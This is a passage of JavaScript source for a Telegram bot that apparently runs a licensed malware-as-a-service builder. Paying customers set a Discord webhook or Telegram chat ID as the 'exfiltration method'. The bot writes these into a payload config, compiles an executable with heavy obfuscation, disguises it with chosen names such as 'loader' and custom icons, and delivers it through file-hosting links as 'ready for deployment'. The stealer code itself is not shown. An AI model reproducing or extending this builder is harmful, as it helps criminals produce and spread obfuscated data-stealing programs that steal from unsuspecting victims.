      userStates.set(userId, { action: 'build_set_exename', keyCode: activeKey.keyCode, method });
      return bot.telegram.sendMessage(chatId, '💎 <b>SET EXE NAME</b>\n\n<blockquote>📝 Enter the desired filename for your executable.\n\n💡 <b>Examples:</b> <code>setup</code>, <code>loader</code>, <code>runtime</code>\n⚠️ <b>Rules:</b> Letters, numbers, <code>-</code> and <code>_</code> only</blockquote>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'cmd_menu' }]] } });
    }
  }

  // No active key - check settings first based on method
  if (missingWebhook) {
    return bot.telegram.sendMessage(chatId, '❌ <b>Action Required:</b> Discord Webhook must be configured for this method.',
      { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔗 Configure Webhook', callback_data: 'cmd_webhook' }], [{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]] } }
    );
  }

  if (missingChatId) {
    return bot.telegram.sendMessage(chatId, '❌ <b>Action Required:</b> Telegram Chat ID must be configured for this method.',
      { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '💬 Configure Chat ID', callback_data: 'cmd_chatid' }], [{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]] } }
    );
  }

  if (!customer.exe_name) {
    return bot.telegram.sendMessage(chatId, '❌ <b>Action Required:</b> Payload identifier must be configured.',
      { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '📝 Set Executable Name', callback_data: 'cmd_exename' }], [{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]] } }
    );
  }

  // All settings present, ask for key
  userStates.set(userId, { action: 'build_start', method });
  return bot.telegram.sendMessage(
    chatId,
    '💎 <b>License Authentication</b>\n\n<blockquote>🛡️ Please enter your <code>premium key code</code> below to proceed.</blockquote>',
    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]] } }
  );
}

/**
 * Start build process
 */
async function startBuild(ctx, customer, exeName, exfilMode = process.env.EXFIL_MODE || 'telegram') {
  const buildStartTime = Date.now();

  console.log('═══════════════════════════════════════════════════════════');
  console.log('[Build] 🚀 Starting new build process');
  console.log('[Build] Customer ID:', customer.id);
  console.log('[Build] Customer Username:', customer.username);
  console.log('[Build] Exe Name:', exeName);
  console.log('[Build] Method:', exfilMode);
  console.log('[Build] Webhook:', customer.webhook_url ? 'Set' : 'Not set');
  console.log('[Build] Chat ID:', customer.telegram_chat_id ? 'Set' : 'Not set');
  console.log('═══════════════════════════════════════════════════════════');

  try {
    await ctx.reply('📝 <i>Injecting user configuration into payload...</i>', { parse_mode: 'HTML' });
    console.log('[Build] Step 1: Updating config.js');

    // Update config with customer's webhook and chat ID
    const configPath = path.join(__dirname, 'config.js');
    console.log('[Build] Config path:', configPath);

    if (!fs.existsSync(configPath)) {
      console.error('[Build] ❌ config.js not found!');
      throw new Error('config.js file not found!');
    }

    let configContent = fs.readFileSync(configPath, 'utf8');
    console.log('[Build] Config file read successfully');

    // Replace webhook URL
    configContent = configContent.replace(
      /WEBHOOK_URL:\s*(?:process\.env\.[A-Z_]+\s*\|\|\s*)?['"].*?['"]/,
      `WEBHOOK_URL: '${customer.webhook_url || ''}'`
    );
    console.log('[Build] Webhook updated in config');

    // Replace telegram chat ID
    configContent = configContent.replace(
      /TELEGRAM_CHAT_ID:\s*(?:process\.env\.[A-Z_]+\s*\|\|\s*)?['"].*?['"]/,
      `TELEGRAM_CHAT_ID: '${customer.telegram_chat_id || ''}'`
    );
    console.log('[Build] Chat ID updated in config');

    // Replace EXFIL_MODE
    configContent = configContent.replace(
      /EXFIL_MODE:\s*(?:process\.env\.[A-Z_]+\s*\|\|\s*)?['"].*?['"]/,
      `EXFIL_MODE: '${exfilMode}'`
    );
    console.log(`[Build] Exfil Mode updated in config to: ${exfilMode}`);

    fs.writeFileSync(configPath, configContent);
    console.log('[Build] ✅ Config file written successfully');

    // Update package.json productName to match user's exeName
    const pkgPath = path.join(__dirname, 'package.json');
    const pkgContent = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
    pkgContent.build.productName = exeName;
    pkgContent.build.appId = `com.${exeName.toLowerCase().replace(/[^a-z0-9]/g, '')}.app`;
    fs.writeFileSync(pkgPath, JSON.stringify(pkgContent, null, 2));
    console.log(`[Build] ✅ package.json productName updated to: ${exeName}`);

    await ctx.reply('✅ <i>Configuration successfully injected!</i>', { parse_mode: 'HTML' });
    console.log('[Build] Step 2: Starting build process');

    await ctx.reply('🔨 <i>Starting compiler engine...</i>', { parse_mode: 'HTML' });

    // Run build with proper Windows command
    const buildCommand = 'npm.cmd run clean && npm.cmd run build';
    console.log('[Build] Starting build process:', buildCommand);
    console.log('[Build] Working directory:', __dirname);

    const buildProcess = exec(buildCommand, {
      cwd: __dirname,
      timeout: 0, // No timeout, allows heavy double obfuscation
      maxBuffer: 50 * 1024 * 1024, // 50MB buffer
      shell: true,
      windowsHide: false // Changed to false to see output
    });

    let buildOutput = '';
    let lastProgressUpdate = Date.now();
    let progressMessageSent = false;

    // Send initial progress message
    setTimeout(() => {
      if (!progressMessageSent) {
        ctx.reply('🔐 <i>Applying MAXIMUM security obfuscation layers...</i>', { parse_mode: 'HTML' }).catch(err => console.error('Progress update error:', err));
        progressMessageSent = true;
      }
    }, 10000); // After 10 seconds

    // Capture stdout
    buildProcess.stdout.on('data', (data) => {
      const output = data.toString();
      buildOutput += output;
      console.log('[Build stdout]', output.trim());

      // Send progress updates every 45 seconds
      const now = Date.now();
      if (now - lastProgressUpdate > 45000) {
        ctx.reply('📦 <i>Packaging payload into executable binary...</i>', { parse_mode: 'HTML' }).catch(err => console.error('Progress update error:', err));
        lastProgressUpdate = now;
      }
    });

    // Capture stderr
    buildProcess.stderr.on('data', (data) => {
      const output = data.toString();
      buildOutput += output;
      console.error('[Build stderr]', output.trim());
    });

    // Handle process completion
    buildProcess.on('close', async (code) => {
      const buildDuration = ((Date.now() - buildStartTime) / 1000).toFixed(1);

      // Restore default icon after build (so next build uses default unless overridden)
      try {
        if (fs.existsSync(DEFAULT_ICON_BACKUP)) {
          fs.copyFileSync(DEFAULT_ICON_BACKUP, DEFAULT_ICON_PATH);
          console.log('[Build] Default icon restored');
        }
      } catch (iconErr) {
        console.error('[Build] Icon restore error:', iconErr.message);
      }

      console.log('═══════════════════════════════════════════════════════════');
      console.log(`[Build] Process closed with code ${code}`);
      console.log(`[Build] Duration: ${buildDuration}s`);
      console.log('═══════════════════════════════════════════════════════════');

      if (code !== 0) {
        console.error(`[Build] ❌ FAILED with code ${code}`);
        console.error('[Build] Last 1000 chars of output:');
        console.error(buildOutput.slice(-1000));

        await ctx.reply(`❌ <b>Build Failed</b> (${buildDuration}s)\n\nExit code: ${code}\n\nPlease try again or contact admin.`, { parse_mode: 'HTML' });
        return;
      }

      console.log('[Build] ✅ SUCCESS - Build completed');

      try {
        await ctx.reply('✅ <i>Build successful! Finalizing artifacts...</i>', { parse_mode: 'HTML' });

        // Find built file
        const distDir = path.join(__dirname, 'dist');
        console.log('[Build] Checking dist directory:', distDir);

        if (!fs.existsSync(distDir)) {
          console.error('[Build] ❌ dist directory not found!');
          throw new Error('dist directory not found!');
        }

        const files = fs.readdirSync(distDir);
        console.log('[Build] Files in dist:', files);

        const exeFile = files.find(f => f.endsWith('.exe'));

        if (!exeFile) {
          console.error('[Build] ❌ No .exe file found in dist!');
          console.error('[Build] Available files:', files);
          throw new Error('Build file not found! No .exe file in dist directory.');
        }

        const exePath = path.join(distDir, exeFile);
        const fileStats = fs.statSync(exePath);
        const sizeMB = (fileStats.size / (1024 * 1024)).toFixed(2);

        console.log(`[Build] ✅ Found exe: ${exeFile}`);
        console.log(`[Build] Size: ${sizeMB} MB`);
        console.log(`[Build] Path: ${exePath}`);

        // Package exe into ZIP for delivery
        await ctx.reply(`📦 <i>Packaging into secure archive...</i>`, { parse_mode: 'HTML' });
        
        const archiver = require('archiver');
        const zipFileName = `${exeName}.zip`;
        const zipFilePath = path.join(distDir, zipFileName);
        
        console.log(`[Build] Creating ZIP: ${zipFileName}`);
        
        await new Promise((resolve, reject) => {
          const zipStream = fs.createWriteStream(zipFilePath);
          const archive = archiver('zip', { zlib: { level: 5 } });
          zipStream.on('close', () => {
            console.log(`[Build] ✅ ZIP created: ${zipFileName} (${archive.pointer()} bytes)`);
            resolve();
          });
          archive.on('error', reject);
          archive.pipe(zipStream);
          archive.file(exePath, { name: `${exeName}.exe` });
          archive.finalize();
        });
        
        const zipStats = fs.statSync(zipFilePath);
        const zipSizeMB = (zipStats.size / (1024 * 1024)).toFixed(2);

        // Upload ZIP to CDN (multi-fallback: Gofile → file.io)
        await ctx.reply(`☁️ <i>Uploading artifact to secure CDN... (${zipSizeMB} MB)</i>`, { parse_mode: 'HTML' });

        let cdnUrl = null;
        try {
          cdnUrl = await uploadWithFallback(zipFilePath, zipFileName);
        } catch (uploadErr) {
          console.error('[Build] All CDN uploads failed:', uploadErr.message);
        }

        if (cdnUrl) {
          // CDN upload succeeded — send download link
          console.log('[Build] ✅ CDN URL sent to user:', cdnUrl);

          await ctx.replyWithHTML(
            `💎 <b>BUILD SUCCESSFULLY COMPLETED</b>\n\n` +
            `<blockquote>📦 <b>Executable:</b> <code>${exeName}.exe</code>\n` +
            `💾 <b>Size:</b> ${sizeMB} MB\n` +
            `⏱ <b>Duration:</b> ${buildDuration}s</blockquote>\n\n` +
            `🌐 <b>Secure Download Link:</b>\n${cdnUrl}\n\n` +
            `<i>(Link will expire shortly after download)</i>`
          );

          await ctx.reply('🎉 <i>Payload is ready for deployment!</i>', { parse_mode: 'HTML' });
        } else if (parseFloat(zipSizeMB) <= 49) {
          // Small enough for Telegram direct (< 50 MB)
          await ctx.reply(`📤 <i>CDN failed, transmitting via Telegram... (${zipSizeMB} MB)</i>`, { parse_mode: 'HTML' });

          console.log('[Build] Sending ZIP via Telegram...');

          await ctx.replyWithDocument(
            { source: zipFilePath, filename: zipFileName },
            {
              caption: `💎 <b>BUILD COMPLETED</b>\n\n📦 <b>Executable:</b> <code>${exeName}.exe</code>\n💾 <b>Size:</b> ${sizeMB} MB\n⏱ <b>Duration:</b> ${buildDuration}s`,
              parse_mode: 'HTML'
            }
          );

          console.log('[Build] ✅ ZIP sent via Telegram!');
          await ctx.reply('🎉 <i>Payload is ready for deployment!</i>', { parse_mode: 'HTML' });
        } else {
          // File too large for Telegram AND all CDN failed
          console.error('[Build] File too large for Telegram and all CDN uploads failed');
          await ctx.replyWithHTML(
            `💎 <b>BUILD COMPLETED</b>\n\n` +
            `<blockquote>📦 <b>Executable:</b> <code>${exeName}.exe</code>\n` +
            `💾 <b>Size:</b> ${sizeMB} MB\n` +
            `⏱ <b>Duration:</b> ${buildDuration}s</blockquote>\n\n` +
            `⚠️ <b>File too large for Telegram (50 MB limit) and all CDN services are currently down.</b>\n\n` +
            `📁 <b>Local path:</b> <code>${zipFilePath}</code>\n\n` +
            `<i>Please retry the upload later or retrieve the file manually.</i>`
          );
        }
        
        // Cleanup ZIP after upload
        try { fs.unlinkSync(zipFilePath); } catch(e) {}

      } catch (error) {
        console.error('[Build] ❌ File send error:', error);
        console.error('[Build] Error stack:', error.stack);
        await ctx.reply(`❌ <b>Transmission Error:</b>\n\n${error.message}\n\nThe build completed but the file could not be sent. Please contact administration.`, { parse_mode: 'HTML' });
      }
    });

    // Handle process error
    buildProcess.on('error', async (error) => {
      console.error('═══════════════════════════════════════════════════════════');
      console.error('[Build] ❌ Process error occurred');
      console.error('[Build] Error:', error.message);
      console.error('[Build] Error stack:', error.stack);
      console.error('═══════════════════════════════════════════════════════════');
      await ctx.reply(`❌ <b>Build Process Error:</b>\n\n${error.message}\n\nPlease contact administration.`, { parse_mode: 'HTML' });
    });

  } catch (error) {
    console.error('═══════════════════════════════════════════════════════════');
    console.error('[Build] ❌ Start error occurred');
    console.error('[Build] Error:', error.message);
    console.error('[Build] Error stack:', error.stack);
    console.error('═══════════════════════════════════════════════════════════');
    await ctx.reply(`❌ <b>Initialization Error:</b>\n\n${error.message}\n\nPlease try again or contact administration.`, { parse_mode: 'HTML' });
  }
}

/**
 * Callback query handler (button clicks)
 */
bot.on('callback_query', async (ctx) => {
  // ctx is a Telegraf Context — actual callback data lives at ctx.callbackQuery
  const cbQuery = ctx.callbackQuery;
  const chatId = cbQuery?.message?.chat?.id;
  const userId = cbQuery?.from?.id;

  try {
    // Check if message exists
    if (!cbQuery?.message || !chatId) {
      console.error('[Callback] No message in callback query');
      await ctx.answerCbQuery('Error: No message').catch(() => { });
      return;
    }

    const data = cbQuery.data;

    // Answer callback query to remove loading state on button
    await ctx.answerCbQuery().catch(() => { });

    console.log(`[Callback] ${data} from @${cbQuery.from.username} (${userId})`);

    // Main menu
    if (data === 'cmd_menu') {
      return bot.telegram.sendMessage(chatId, '📋 Main Menu:', getMainMenu());
    }

    // Activate key
    if (data === 'cmd_key') {
      const customer = db.getCustomer(String(userId));
      if (customer) {
        const activeKey = db.getCustomerActiveKey(customer.id);
        if (activeKey) {
          const expiresAt = formatDate(activeKey.expiresAt);
          return bot.telegram.sendMessage(
            chatId,
            `💎 <b>LICENSE ACTIVE</b>\n\n<blockquote>✅ You already have an active license.\n\n🔑 <b>Key:</b> <code>${activeKey.keyCode}</code>\n⏰ <b>Expires:</b> <i>${expiresAt}</i>\n📅 <b>Duration:</b> <code>${activeKey.durationType}</code></blockquote>\n\n<i>Your key is valid. No need to activate another one.</i>`,
            { parse_mode: 'HTML', ...getMainMenu(userId) }
          );
        }
      }

      userStates.set(userId, { action: 'activate_key' });
      return bot.telegram.sendMessage(
        chatId,
        '💎 <b>License Authentication</b>\n\n<blockquote>🛡️ Please enter your <code>premium key code</code> below to activate your license.</blockquote>',
        {
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]
            ]
          }
        }
      );
    }

    // Check key status
    if (data === 'cmd_check') {
      const customer = db.getCustomer(String(userId));

      if (!customer) {
        return bot.telegram.sendMessage(chatId, '❌ No active key found.', getMainMenu());
      }

      const builds = db.getCustomerBuilds(customer.id);

      let message = `💎 <b>LICENSE & STATUS DASHBOARD</b>\n\n`;
      message += `<blockquote>👤 <b>Profile:</b> @${customer.username || 'Unknown'}\n`;
      message += `🆔 <b>Account ID:</b> <code>${customer.telegramId}</code>\n`;
      message += `📅 <b>Member Since:</b> <i>${formatDate(customer.createdAt)}</i></blockquote>\n\n`;

      message += `⚙️ <b>SYSTEM CONFIGURATION</b>\n`;
      message += `<blockquote>🌐 <b>Webhook:</b> ${customer.webhook_url ? '🟢 <i>Active</i>' : '🔴 <i>Missing</i>'}\n`;
      message += `💬 <b>Chat ID:</b> ${customer.telegram_chat_id ? '🟢 <i>Linked</i>' : '🔴 <i>Missing</i>'}\n`;
      message += `🏷️ <b>Payload:</b> <code>${customer.exe_name || 'Not set'}</code></blockquote>\n\n`;

      message += `📈 <b>USAGE STATISTICS</b>\n`;
      message += `<blockquote>📦 <b>Total Compilations:</b> <code>${builds.length}</code></blockquote>`;

      return bot.telegram.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu(userId) });
    }

    // Set webhook
    if (data === 'cmd_webhook') {
      const customer = db.getCustomer(String(userId));

      if (!customer) {
        return bot.telegram.sendMessage(chatId, '❌ You must register with the /start command first.', getMainMenu());
      }

      const activeKeyW = db.getCustomerActiveKey(customer.id);
      if (!activeKeyW) {
        return bot.telegram.sendMessage(chatId, '❌ <b>No Active License</b>\n\nPlease activate a key first before configuring settings.', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔑 Activate Key', callback_data: 'cmd_key' }, { text: '🔙 Dashboard', callback_data: 'cmd_menu' }]] } });
      }

      if (customer.webhook_url) {
        return bot.telegram.sendMessage(chatId,
          `💎 <b>WEBHOOK CONFIGURATION</b>\n\n<blockquote>✅ Your <code>Discord Webhook</code> is currently active and fully configured.</blockquote>\n\n<i>Do you wish to modify your existing setup?</i>`,
          {
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '🔄 Update Webhook', callback_data: 'cmd_webhook_force' },
                  { text: '🔙 Dashboard', callback_data: 'cmd_menu' }
                ]
              ]
            }
          }
        );
      }

      userStates.set(userId, { action: 'set_webhook' });
      return bot.telegram.sendMessage(chatId, '💎 <b>WEBHOOK INITIALIZATION</b>\n\n<blockquote>🌐 Please provide your <code>Discord Webhook URL</code> below to establish a secure data stream.</blockquote>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]] } });
    }

    // Force webhook change
    if (data === 'cmd_webhook_force') {
      userStates.set(userId, { action: 'set_webhook' });
      return bot.telegram.sendMessage(chatId, '💎 <b>WEBHOOK CONFIGURATION</b>\n\n<blockquote>🌐 Please provide your new <code>Discord Webhook URL</code> below to establish a secure connection.</blockquote>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]] } });
    }

    // Set chat ID
    if (data === 'cmd_chatid') {
      const customer = db.getCustomer(String(userId));

      if (!customer) {
        return bot.telegram.sendMessage(chatId, '❌ You must register with the /start command first.', getMainMenu());
      }

      const activeKeyC = db.getCustomerActiveKey(customer.id);
      if (!activeKeyC) {
        return bot.telegram.sendMessage(chatId, '❌ <b>No Active License</b>\n\nPlease activate a key first before configuring settings.', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔑 Activate Key', callback_data: 'cmd_key' }, { text: '🔙 Dashboard', callback_data: 'cmd_menu' }]] } });
      }

      userStates.set(userId, { action: 'set_chatid' });
      const currentChatId = customer.telegram_chat_id ? `<blockquote>🔐 Active ID: <code>${customer.telegram_chat_id}</code></blockquote>\n` : '';
      return bot.telegram.sendMessage(chatId, `💎 <b>CHAT ID CONFIGURATION</b>\n\n${currentChatId}<blockquote>💬 Enter your <code>Telegram Chat ID</code> below to route notifications securely.</blockquote>`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]] } });
    }

    // Set exe name
    if (data === 'cmd_exename') {
      const customer = db.getCustomer(String(userId));

      if (!customer) {
        return bot.telegram.sendMessage(chatId, '❌ You must register with the /start command first.', getMainMenu());
      }

      const activeKeyE = db.getCustomerActiveKey(customer.id);
      if (!activeKeyE) {
        return bot.telegram.sendMessage(chatId, '❌ <b>No Active License</b>\n\nPlease activate a key first before configuring settings.', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔑 Activate Key', callback_data: 'cmd_key' }, { text: '🔙 Dashboard', callback_data: 'cmd_menu' }]] } });
      }

      userStates.set(userId, { action: 'set_exename' });
      const currentName = customer.exe_name ? `\n<blockquote>🏷️ Active: <code>${customer.exe_name}.exe</code></blockquote>\n` : '';
      return bot.telegram.sendMessage(chatId, `💎 <b>SET EXE NAME</b>${currentName}\n<blockquote>📝 Enter the desired filename for your executable.\n\n💡 <b>Examples:</b> <code>setup</code>, <code>loader</code>, <code>runtime</code>\n⚠️ <b>Rules:</b> Letters, numbers, <code>-</code> and <code>_</code> only</blockquote>`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'cmd_menu' }]] } });
    }

    // Build Menu (Method Selection)
    if (data === 'cmd_build') {
      const customer = db.getCustomer(String(userId));

      if (!customer) {
        return bot.telegram.sendMessage(chatId, '❌ Please register first with /start command.', getMainMenu());
      }

      const activeKeyB = db.getCustomerActiveKey(customer.id);
      if (!activeKeyB) {
        return bot.telegram.sendMessage(chatId, '❌ <b>No Active License</b>\n\nYou need to activate a key before building.', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔑 Activate Key', callback_data: 'cmd_key' }, { text: '🔙 Dashboard', callback_data: 'cmd_menu' }]] } });
      }

      const existingPosition = getUserQueuePosition(userId);
      if (existingPosition > 0) {
        return bot.telegram.sendMessage(chatId, `⏳ You are already in queue at position #${existingPosition}`, getMainMenu());
      }

      return bot.telegram.sendMessage(
        chatId,
        '💎 <b>EXFILTRATION METHOD</b>\n\n<blockquote>📡 Select your preferred data delivery channel for the payload.</blockquote>',
        {
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '💬 Telegram Log', callback_data: 'build_method_telegram' },
                { text: '🌐 Discord Log', callback_data: 'build_method_discord' }
              ],
              [{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]
            ]
          }
        }
      );
    }

    // Handle Method Selection — ask icon question before proceeding
    if (data.startsWith('build_method_')) {
      const method = data.replace('build_method_', '');
      userStates.set(userId, { action: 'awaiting_icon_choice', method });
      return bot.telegram.sendMessage(
        chatId,
        '💎 <b>CUSTOM ICON</b>\n\n<blockquote>🎨 Would you like to set a <b>custom icon</b> for your executable?\n\nYou can send any image (PNG, JPG, BMP, WEBP) and it will be automatically converted to 256×256 ICO format.</blockquote>',
        {
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '✅ Yes, I\'ll send an icon', callback_data: 'icon_yes' },
                { text: '❌ No, use default', callback_data: 'icon_no' }
              ],
              [{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]
            ]
          }
        }
      );
    }

    // Handle icon choice — Yes
    if (data === 'icon_yes') {
      const state = userStates.get(userId);
      if (!state || state.action !== 'awaiting_icon_choice') {
        return bot.telegram.sendMessage(chatId, '❌ Session expired. Please start over.', getMainMenu(userId));
      }
      userStates.set(userId, { ...state, action: 'awaiting_icon_upload' });
      return bot.telegram.sendMessage(
        chatId,
        '� <b>SEND YOUR ICON</b>\n\n<blockquote>� Send an image now (PNG, JPG, BMP, WEBP).\n\nIt will be automatically resized to <code>256×256</code> and converted to ICO format.</blockquote>',
        {
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [{ text: ' Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]
            ]
          }
        }
      );
    }

    // Handle icon choice — No (use default)
    if (data === 'icon_no') {
      const state = userStates.get(userId);
      if (!state || state.action !== 'awaiting_icon_choice') {
        return bot.telegram.sendMessage(chatId, '❌ Session expired. Please start over.', getMainMenu(userId));
      }
      const method = state.method;
      // Continue build flow with default icon
      return continueAfterIcon(ctx, chatId, userId, method);
    }

    // Queue status
    if (data === 'cmd_queue') {
      const userPosition = getUserQueuePosition(userId);

      let message = `💎 <b>BUILD QUEUE</b>\n\n`;
      message += `<blockquote>⚙️ Server: ${isProcessing ? '🟢 Processing' : '⚪ Idle'}\n`;
      message += `📦 In Queue: <code>${buildQueue.length}</code>\n\n`;
      message += `👤 Your Position: ${userPosition > 0 ? `<code>#${userPosition}</code>` : '<i>Not in queue</i>'}\n`;
      message += `⏳ Est. Wait: ${userPosition > 0 ? `~${userPosition * 3} min` : 'N/A'}</blockquote>`;

      if (buildQueue.length > 0) {
        message += `\n\n<blockquote>📋 <b>Queue:</b>\n`;
        message += buildQueue.slice(0, 5).map((item, index) =>
          `${index === 0 && isProcessing ? '▶️' : '⏳'} #${item.queueNumber} — @${item.user.username || 'Unknown'}`
        ).join('\n');

        if (buildQueue.length > 5) {
          message += `\n+${buildQueue.length - 5} more`;
        }
        message += `</blockquote>`;
      }

      return bot.telegram.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu(userId) });
    }

    // My info
    if (data === 'cmd_myinfo') {
      const customer = db.getCustomer(String(userId));

      if (!customer) {
        return bot.telegram.sendMessage(chatId, '❌ You must register with the /start command first.', getMainMenu());
      }

      const builds = db.getCustomerBuilds(customer.id);

      let message = `💎 <b>LICENSE & STATUS DASHBOARD</b>\n\n`;
      message += `<blockquote>👤 <b>Profile:</b> @${customer.username || 'Unknown'}\n`;
      message += `🆔 <b>Account ID:</b> <code>${customer.telegramId}</code>\n`;
      message += `📅 <b>Member Since:</b> <i>${formatDate(customer.createdAt)}</i></blockquote>\n\n`;

      message += `⚙️ <b>SYSTEM CONFIGURATION</b>\n`;
      message += `<blockquote>🌐 <b>Webhook:</b> ${customer.webhook_url ? '🟢 <i>Active</i>' : '🔴 <i>Missing</i>'}\n`;
      message += `💬 <b>Chat ID:</b> ${customer.telegram_chat_id ? '🟢 <i>Linked</i>' : '🔴 <i>Missing</i>'}\n`;
      message += `🏷️ <b>Payload:</b> <code>${customer.exe_name || 'Not set'}</code></blockquote>\n\n`;

      message += `📈 <b>USAGE STATISTICS</b>\n`;
      message += `<blockquote>📦 <b>Total Compilations:</b> <code>${builds.length}</code></blockquote>`;

      return bot.telegram.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu(userId) });
    }

    // Admin Panel
    if (data === 'cmd_admin_panel') {
      if (!db.isAdmin(String(userId))) {
        return bot.telegram.sendMessage(chatId, '❌ You do not have permission to view this panel.');
      }

      const adminKeyboard = {
        reply_markup: {
          inline_keyboard: [
            [
              { text: '➕ Create Key', callback_data: 'cmd_admin_create' },
              { text: '🗑 Delete Key', callback_data: 'cmd_admin_delete' }
            ],
            [
              { text: '🔑 All Keys', callback_data: 'cmd_admin_list' },
              { text: '👥 Customers', callback_data: 'cmd_admin_customers' }
            ],
            [
              { text: '📊 Statistics', callback_data: 'cmd_admin_stats' },
              { text: '🔙 Main Menu', callback_data: 'cmd_admin_back' }
            ]
          ]
        }
      };

      return bot.telegram.sendMessage(chatId, '👑 <b>Admin Panel</b>\n\nPlease select an action:', { parse_mode: 'HTML', ...adminKeyboard });
    }

    // Admin actions routing
    if (data.startsWith('cmd_admin_')) {
      if (!db.isAdmin(String(userId))) return;

      const action = data.split('_')[2];

      switch (action) {
        case 'create':
          const keyboard = Markup.inlineKeyboard([
            [Markup.button.callback('1 Day', 'create_1day'), Markup.button.callback('3 Days', 'create_3days'), Markup.button.callback('7 Days', 'create_7days')],
            [Markup.button.callback('1 Month', 'create_1month'), Markup.button.callback('3 Months', 'create_3months')],
            [Markup.button.callback('1 Year', 'create_1year'), Markup.button.callback('Lifetime', 'create_lifetime')]
          ]);
          return bot.telegram.sendMessage(chatId, '⏰ Select key duration:', keyboard);
        case 'delete':
          userStates.set(userId, { action: 'delete_key' });
          return bot.telegram.sendMessage(chatId, '🗑 Enter the key code to delete:');
        case 'list':
          const keys = db.getAllKeys();
          if (keys.length === 0) return bot.telegram.sendMessage(chatId, '📭 No keys generated yet.');
          let keyMsg = `🔑 <b>All Keys (${keys.length})</b>\n\n`;
          keys.slice(0, 10).forEach((key, i) => {
            const status = key.isUsed ? '✅ Used' : new Date(key.expiresAt) < new Date() ? '⏰ Expired' : '🟢 Active';
            keyMsg += `<b>${i + 1}.</b> <code>${key.keyCode}</code>\n   Duration: ${key.durationType} | Status: ${status}\n`;
          });
          return bot.telegram.sendMessage(chatId, keyMsg, { parse_mode: 'HTML' });
        case 'customers':
          const customers = db.getAllCustomers();
          if (customers.length === 0) return bot.telegram.sendMessage(chatId, '📭 No customers yet.');
          let custMsg = `👥 <b>Customers (${customers.length})</b>\n\n`;
          customers.slice(0, 10).forEach((c, i) => {
            const activeKey = db.getCustomerActiveKey(c.id);
            let keyStatus = '🔴 None';
            if (activeKey) {
              const exp = new Date(activeKey.expiresAt);
              const now = new Date();
              const daysLeft = Math.ceil((exp - now) / (1000 * 60 * 60 * 24));
              keyStatus = `🟢 <code>${activeKey.keyCode}</code> (${activeKey.durationType}, ${daysLeft}d left)`;
            }
            custMsg += `<b>${i + 1}.</b> @${c.username || 'Unknown'} (ID: <code>${c.telegramId}</code>)\n   🔑 ${keyStatus}\n   Builds: ${c.totalBuilds} | Keys: ${c.totalKeysUsed}\n\n`;
          });
          return bot.telegram.sendMessage(chatId, custMsg, { parse_mode: 'HTML' });
        case 'stats':
          const stats = db.getStatistics();
          let statMsg = '📊 <b>Statistics</b>\n\n';
          statMsg += `🔑 Total Keys: ${stats.totalKeys} (Active: ${stats.activeKeys}, Used: ${stats.usedKeys})\n`;
          statMsg += `👥 Total Customers: ${stats.totalCustomers}\n`;
          statMsg += `📦 Total Builds: ${stats.totalBuilds}\n`;
          return bot.telegram.sendMessage(chatId, statMsg, { parse_mode: 'HTML' });
        case 'back':
          return bot.telegram.sendMessage(chatId, '📋 Main Menu:', getMainMenu(userId));
      }
    }

  } catch (error) {
    console.error('[Callback] Error:', error);
    if (chatId) {
      bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again.').catch(e => console.error('[Callback] Failed to send error message:', e));
    }
  }
});

// Error handling
bot.catch((err, ctx) => {
  console.error('Bot error:', err);
  ctx.reply('❌ An error occurred. Please try again.');
});

// Start bot
console.log('═══════════════════════════════════════════════════════════');
console.log('🤖 317 NUMBER ONE License Bot starting...');
console.log('═══════════════════════════════════════════════════════════');

// Set admin from environment
const ADMIN_ID = process.env.ADMIN_TELEGRAM_ID;
if (ADMIN_ID) {
  db.setAdmin(ADMIN_ID);
  console.log(`👑 Admin set: ${ADMIN_ID}`);
} else {
  console.warn('⚠️  No admin ID set in .env file');
}

console.log('');
console.log('📊 Database Statistics:');
const stats = db.getStatistics();
console.log(`   Keys: ${stats.totalKeys} (${stats.activeKeys} active, ${stats.usedKeys} used)`);
console.log(`   Customers: ${stats.totalCustomers}`);
console.log(`   Builds: ${stats.totalBuilds}`);
console.log('');

bot.launch()
  .then(() => {
    console.log('═══════════════════════════════════════════════════════════');
    console.log('✅ Bot started successfully!');
    console.log('📝 Use /start to begin');
    if (ADMIN_ID) {
      console.log(`👑 Admin: ${ADMIN_ID}`);
    }
    console.log('═══════════════════════════════════════════════════════════');
    console.log('');
